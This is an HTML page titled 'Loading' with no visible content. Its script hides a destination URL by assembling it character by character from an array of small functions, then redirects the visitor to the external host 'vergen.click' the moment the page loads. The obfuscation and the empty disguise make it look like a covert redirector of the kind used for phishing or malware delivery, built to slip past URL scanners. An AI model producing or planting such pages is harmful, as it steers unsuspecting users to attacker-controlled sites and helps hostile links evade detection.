<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            function() { return 'h'; },
            _ => 't',
            () => 't',
            function() { return 'p'; },
            _ => 's',
            () => ':',
            () => '/',
            function() { return '/'; },
            _ => 'v',
            _ => 'e',
            _ => 'r',
            function() { return 'g'; },
            function() { return 'e'; },
            function() { return 'n'; },
            () => '.',
            _ => 'c',
            () => 'l',
            () => 'i',
            function() { return 'c'; },
            _ => 'k',
            () => '/',
            function() { return 's'; },
            function() { return '/'; },
            _ => 'n',
            () => 'e',
            () => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
